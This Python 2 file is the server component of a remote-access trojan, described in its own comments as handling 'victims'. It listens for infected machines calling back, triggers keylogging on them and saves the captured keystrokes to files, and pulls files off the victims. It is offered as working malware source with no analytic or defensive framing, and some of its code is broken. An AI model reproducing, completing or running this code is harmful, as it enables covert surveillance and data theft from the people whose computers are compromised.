from __future__ import print_function
import socket
import datetime
import threading
from Tkinter import END, NORMAL
import db
import Connection
import struct

class Server:
    """
    Server class to handle server operations
    These include:
        1. accept connections
        2. pass information to client GUI
        3. execute commands from client.py
        4. Handle DB operations
    """

    def __init__(self):
        return

    def getIP(f):
        """
        get the IP of machine the server class is running on by connecting to www.google.com
        and reading the IP address
        """
        s = socket.socket()
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(('google.com', 0))
        host = s.getsockname()[0]
        s.close()
        return host

    port = 44444
    cli = None
    s = socket.socket()
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((getIP("d"), port))
    s.listen(5)
    DB = db.DB()

    @staticmethod
    def newConn(nc):
        """
        function is used in thread to handle when client has disconnected
        Not very efficient but consistently checks to see if victim is connected
        :param nc: connection object
        :return:
        """
        while (True):
            try:
                nc.socket.getpeername()
            except:
                ip = nc.ip
                hostname = nc.hostname
                Server.updateTextbox(hostname + "@ " + str(ip[0]) + " has disconnected...\n")
                return


    @staticmethod
    def trimMessage(m):
        """
        trims the message received from victim to readable form
        :param m: string from socket.recv()
        :return:
        """
        newM = m.split('\x00')[0]
        return newM

    @staticmethod
    def waitForConns():
        """
        used in thread when waiting for victims to callback
        """
        Server.updateTextbox("Waiting for connections...\n")
        while (True):
            global s
            c, addr = Server.s.accept()
            hostname = Server.trimMessage(Server.recvMsg(c))
            uniq = Server.trimMessage(Server.recvMsg(c))
            print(uniq)
            if(uniq == "-1"):
                c.send("Welcome to the server...\n")
                #client connected, not victim
            else:
                nc = Connection.Connection(uniq ,addr, hostname, c)
                Server.updateTextbox(str(nc.hostname) + "@ " + str(nc.ip[0]) + " has connected..." +"\n")
                #cli.connections.append(str(nc.unique) + " - "+str(nc.ip[0]) + " - " + str(nc.hostname))
                #cli.redrawClientMenu()
                t = threading.Thread(target=Server.newConn, args=[nc])
                t.setDaemon(True)
                t.start()

    @staticmethod
    def updateTextbox(s):
        """
        sends string to be put into text box on client GUI
        :param s: string
        :return:
        """
        print(s)
        #cli.text.config(state=NORMAL)
        #cli.text.insert(END, s)

    @staticmethod
    def keyLog(conn):
        sock = socket.socket(conn.socket)
        sock.sendall("log")
        Server.recvKeyLogs(conn)

    @staticmethod
    def recvKeyLogs(conn):
        """
        keys pressed by victim are handled by this function
        they are logged in a text file
        """
        host = conn.hostname
        date = str(datetime.date.today())
        f = open(host+"_"+date+'_keys.txt', 'w')
        while (True):
            sock = socket.socket(conn.socket)
            key = sock.recv(512)
            f.write(key)
            print(key[0][0])

    #need to make this handle Connection objects and no list
    def whatDo(self, cmd):
        """
        handles command from client.py
        decides what command the user wants to execute
        """
        if (cmd[1] == "log"):
            Server.keyLog(cmd[0])
        elif("keylog" == cmd[1]):
            Server.keyLog(cmd[0])
        elif ("download" in cmd[1]):
            Server.downloadFile(cmd[0])


    def downloadFile(sock):
        """
         fucntion that requests and handles download
         sock: socket object
        """
        sock.send("send")
        f = open("test.jpg", "w")
        while (True):
            line = sock.recv(1024)
            print(line)
            f.write(line)

    @staticmethod
    def sendMsg(sock, m):
        m = struct.pack('>I', len(m)) + m
        sock.sendall(m)

    @staticmethod
    def recvMsg(sock):
        rawMsgLen = Server.recvall(sock, 4)
        msgLen = struct.unpack('>I', rawMsgLen)[0]
        return Server.recvall(sock, msgLen)

    @staticmethod
    def recvall(sock, n):
        data = ''
        while len(data) < n:
            packet = sock.recv(n-len(data))
            data += packet
        return data

    def startServer(self):
        Server.waitForConns()
